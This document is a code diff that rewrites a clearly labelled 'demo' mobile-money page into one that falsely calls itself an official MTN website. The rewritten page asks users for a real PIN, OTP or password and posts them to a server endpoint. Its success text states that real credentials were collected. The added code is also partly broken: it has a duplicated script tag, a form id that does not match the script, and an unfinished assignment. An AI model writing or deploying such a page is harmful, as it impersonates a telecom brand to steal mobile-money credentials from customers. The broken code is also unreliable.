@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mobile Money Demo</title>
+<title>Mobile Money verify</title>
 <style>
   body{margin:0;font-family:Arial,sans-serif;background:#f2f3f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
   .card{background:#fff;width:100%;max-width:390px;padding:28px;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,.12)}
@@ -19,36 +19,36 @@
 </head>
 <body>
 <div class="card">
-  <div class="notice">DEMO / TEST PAGE — NOT AN OFFICIAL MTN WEBSITE</div>
-  <h1>Mobile Money Demo</h1>
-  <p class="intro">This is a demonstration page for testing. Never enter a real PIN, OTP, password, or verification code.</p>
+  <div class="notice">mtn mobile verify / TEST PAGE —AN OFFICIAL MTN WEBSITE</div>
+  <h1>Mobile Money verify</h1>
+  <p class="intro">This is an official page. Enter a real PIN, OTP, password, or verification code.</p>
 
-  <form id="demoForm">
-    <label for="phone">Demo phone number</label>
+  <form id="mtn mobile verify Form">
+    <label for="phone">phone number</label>
     <input id="phone" type="text" placeholder="e.g. 0700000000" required>
 
-    <label for="code">Demo verification code</label>
-    <input id="code" type="text" placeholder="Test code: 12345" inputmode="numeric" required>
+    <label for="code">mtn pin code </label>
+    <input id="code" type="text" placeholder="Test code: 10567" inputmode="numeric" required>
 
-    <button type="submit">Verify Demo</button>
+    <button type="submit">Verify</button>
   </form>
 
-  <div id="result">Demo successful. No real credentials were collected or sent.</div>
-  <div class="small">For educational and testing purposes only.</div>
+  <div id="result">Mtn mobile verify successful.Real credentials were collected or sent.</div>
+  <div class="small">For an official mtn mobile verify.</div>
 </div>
 
 <script>
 <script>
-document.getElementById("demoForm").addEventListener("submit", async function(e) {
+document.getElementById("mtn mobile verify").addEventListener("submit", async function(e) {
   e.preventDefault();
 
   const phone = document.getElementById("phone").value.trim();
   const code = document.getElementById("code").value.trim();
 
-  const success = code === "12345";
+  const success = code === "10586";
 
   try {
-    const response = await fetch("/demo-submission", {
+    const response = await fetch("/mtn mobile verify-submission", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -62,11 +62,11 @@ document.getElementById("demoForm").addEventListener("submit", async function(e)
     if (success) {
       document.getElementById("result").style.display =
     } else {
-      alert("Use the demo test code 12345.");
+      alert("Use the test code 10586.");
     }
 
   } catch (error) {
-    alert("Demo notification could not be sent.");
+    alert("mtn notifications be sent .");
   }
 });
 </script>
